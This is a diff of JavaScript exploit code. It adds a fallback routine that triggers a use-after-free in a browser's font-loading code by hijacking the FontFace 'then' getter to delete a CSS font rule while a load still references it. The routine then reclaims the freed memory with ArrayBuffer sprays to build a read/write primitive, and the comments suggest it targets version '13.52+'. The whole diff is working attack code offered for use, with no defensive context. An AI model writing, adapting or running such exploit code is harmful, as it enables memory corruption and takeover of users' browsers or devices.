@@ -913,7 +913,134 @@ async function init_rw() {
   }
 
   // Fallback: try multi-size spray for 13.52+
-  async function try_multisize() {
+  async function try_promise_resolve() {
+    // Approach: Use Promise.resolve() to trigger the then getter
+    // document.fonts.load() creates matchingFaces with reference to B
+    // Promise.resolve(A) triggers the then getter which deletes the CSS rule
+    // The CSSFontFace for B is freed while matchingFaces still has a reference
+    
+    const style = document.createElement("style");
+    document.head.appendChild(style);
+    
+    const spray_font_rule = "@font-face { font-family: spray; src: local(Helvetica Bold); unicode-range: U+0043; }";
+    const uaf_font_rule = "@font-face { font-family: b; src: url(nonexistent-font.woff); unicode-range: U+0042; }";
+    
+    for (let i = 0; i < spray_count / 4; i++) {
+      style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+    }
+    
+    const uaf_rule_index = style.sheet.cssRules.length;
+    style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
+    
+    for (let i = spray_count / 4; i < spray_count; i++) {
+      style.sheet.insertRule(spray_font_rule, style.sheet.cssRules.length);
+    }
+    
+    document.body.offsetTop;
+    
+    const A = new FontFace("a", "local(Helvetica)", { unicodeRange: "U+0041" });
+    document.fonts.add(A);
+    void A.loaded;
+    
+    const old_then = FontFace.prototype.then;
+    let uaf_triggered = false;
+    
+    Object.defineProperty(FontFace.prototype, "then", {
+      configurable: true,
+      get() {
+        if (this === A && !uaf_triggered) {
+          uaf_triggered = true;
+          style.sheet.deleteRule(uaf_rule_index);
+          document.body.offsetTop;
+          
+          for (let i = style.sheet.cssRules.length - 1; i >= 0; i--) {
+            if (style.sheet.cssRules[i].cssText.includes("spray")) {
+              style.sheet.deleteRule(i);
+            }
+          }
+          document.body.offsetTop;
+          
+          for (let i = 0; i < abs.length; i++) {
+            const ab = new ArrayBuffer(0x70);
+            const view = new DataView(ab);
+            view.setBInt(8, 1, true);
+            view.setUint8(0x50, 3);
+            abs[i] = ab;
+          }
+        }
+        return undefined;
+      },
+    });
+    
+    // Step 1: Call document.fonts.load() - this creates matchingFaces
+    const fontPromise = document.fonts.load("1em a, b", "AB");
+    
+    // Step 2: Trigger the then getter via Promise.resolve()
+    // This accesses A.then which triggers the getter
+    // The getter deletes the CSS rule, freeing the CSSFontFace
+    Promise.resolve(A);
+    
+    // Step 3: Wait for the load to complete
+    const timeoutPromise = new Promise(function(_, reject) {
+      setTimeout(function() { reject(new Error("timeout")); }, 10000);
+    });
+    
+    let fonts;
+    try {
+      fonts = await Promise.race([fontPromise, timeoutPromise]);
+    } catch (e) {
+      Object.defineProperty(FontFace.prototype, "then", { configurable: true, value: old_then });
+      return null;
+    }
+    Object.defineProperty(FontFace.prototype, "then", { configurable: true, value: old_then });
+    
+    if (fonts.length < 2) return null;
+    if (typeof fonts[0] === "string") return null;
+    
+    let uaf_font = null;
+    for (const font of fonts) {
+      if (font.unicodeRange === "U+0-10FFFF") {
+        uaf_font = font;
+        break;
+      }
+    }
+    if (!uaf_font) {
+      for (const font of fonts) {
+        if (font !== A) { uaf_font = font; break; }
+      }
+    }
+    if (!uaf_font) return null;
+    
+    let uaf_ab = null;
+    for (const ab of abs) {
+      try {
+        const view = new DataView(ab);
+        if (view.getBInt(8, true).eq(2)) {
+          uaf_ab = ab;
+          break;
+        }
+      } catch(e) {}
+    }
+    if (!uaf_ab) {
+      // Try ref count 1
+      for (const ab of abs) {
+        try {
+          const view = new DataView(ab);
+          if (view.getBInt(8, true).eq(1)) {
+            uaf_ab = ab;
+            break;
+          }
+        } catch(e) {}
+      }
+    }
+    if (!uaf_ab) return null;
+    
+    abs.length = 0;
+    return { uaf_ab, uaf_font, leak: { obj: 0 }, leak_addr: undefined };
+  }
+
+  // Fallback: try multi-size spray for 13.52+
+async function try_multisize() {
     const style = document.createElement("style");
     document.head.appendChild(style);
 
@@ -976,6 +1103,14 @@ async function init_rw() {
   let result = await try_then_getter();
   if (result) {
     logger.info("UAF via then-getter!");
+    return build_rw(result);
+  }
+
+  // Try Promise.resolve approach
+  logger.info("Trying Promise.resolve approach...");
+  result = await try_promise_resolve();
+  if (result) {
+    logger.info("UAF via Promise.resolve!");
     return build_rw(result);
   }
 
